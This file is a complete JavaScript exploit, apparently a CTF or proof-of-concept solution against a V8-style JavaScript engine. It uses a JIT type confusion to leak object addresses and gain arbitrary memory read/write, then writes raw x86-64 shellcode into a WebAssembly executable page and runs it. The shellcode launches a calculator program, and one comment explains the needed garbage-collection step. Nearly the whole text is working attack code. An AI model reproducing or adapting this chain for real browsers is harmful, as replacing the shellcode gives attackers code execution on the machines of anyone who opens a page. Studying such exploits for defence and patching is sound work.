var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var Uint32 = new Uint32Array(buf);

function f2i(f)
{
	float64[0] = f;
	let tmp = Array.from(Uint32);
	return tmp[1] * 0x100000000 + tmp[0]; 
}

function i2f(i)
{
	let tmp = [];
	tmp[0] = parseInt(i % 0x100000000);
	tmp[1] = parseInt((i-tmp[0]) / 0x100000000);
	Uint32.set(tmp);
	return float64[0];
}

function hex(i)
{
	return i.toString(16).padStart(16, "0");
}


function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var wasm_function = wasmInstance.exports.main;

function addrOf(obj){

	let o = {a: 13.37, b: 14.47};

	function triggerReadTypeConfuse(o, callback) {
    		var tmp = o.a;
    		callback();
    		return o.b;
	}
	function evil() {
    		o.b = obj;
	}
	for(let i=0; i<100000; i++) {
    		triggerReadTypeConfuse(o, ()=>1);
    		triggerReadTypeConfuse(o, ()=>2);
   			triggerReadTypeConfuse(o, ()=>3);
	}

	let addr = f2i(triggerReadTypeConfuse(o, evil));
	return addr;
}

function overwrite_p(target, value){
	var o = {a: 1};
	o.b = 13.27;
	function triggerReadTypeConfuse(o, callback) {
    		var tmp = o.a;
    		callback();
			o.b = value;
    		return o.b;
	}
	function evil() {
    		o.b = target;
	}
	for(let i=0; i<100000; i++) {
    		triggerReadTypeConfuse(o, ()=>1);
    		triggerReadTypeConfuse(o, ()=>2);
    		triggerReadTypeConfuse(o, ()=>3);
	}
	var r = triggerReadTypeConfuse(o, evil);
}

var data_buf = new ArrayBuffer(200);

gc(); // 需要进行垃圾回收，将data_buf移到old space，并且地址不会再变化，不进行回收，后续会失败。

var data_buf_addr = addrOf(data_buf);
var victim = {inline:42};

victim.offset0 = {};
victim.offset8 = {};
victim.offset16 = {};

overwrite_p(victim, i2f(data_buf_addr));

var view_buf = new ArrayBuffer(200);
victim.offset16 = view_buf;

var data_view = new DataView(data_buf);

function dataview_read64(addr)
{
	data_view.setFloat64(31, i2f(addr), true);
	var view_view = new DataView(view_buf);
	return f2i(view_view.getFloat64(0, true));
}

//----- arbitrary write

function dataview_write(addr, payload)
{
	data_view.setFloat64(31, i2f(addr), true);
	var view_view = new DataView(view_buf);
	for(let i=0; i < payload.length; i++)
	{
		view_view.setUint8(i, payload[i]);
	}
}

function addrOfWasmObj(obj){
	data_buf.leakobj = obj;
	let mapAddr = dataview_read64(data_buf_addr-1);
	let instance_addr = dataview_read64(mapAddr + 0x2f);
	let objAddr = dataview_read64(instance_addr + 0x2f);
	return objAddr;
}

var wasm_function_addr = addrOfWasmObj(wasm_function);
console.log("[+] wasm_function_addr : 0x" + hex(wasm_function_addr));

var wasm_shared_info = dataview_read64(wasm_function_addr -1 + 0x20);
console.log("[+] find wasm_shared_info : 0x" + hex(wasm_shared_info));

var wasm_code = dataview_read64(wasm_shared_info -1 + 0x8);
console.log("[+] find wasm_code : 0x" + hex(wasm_code));

var wasm_rwx = wasm_code - 0x81 + 0xe0;
console.log("[+] find wasm_rwx : 0x" + hex(wasm_rwx));

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

dataview_write(wasm_rwx, shellcode);

wasm_function();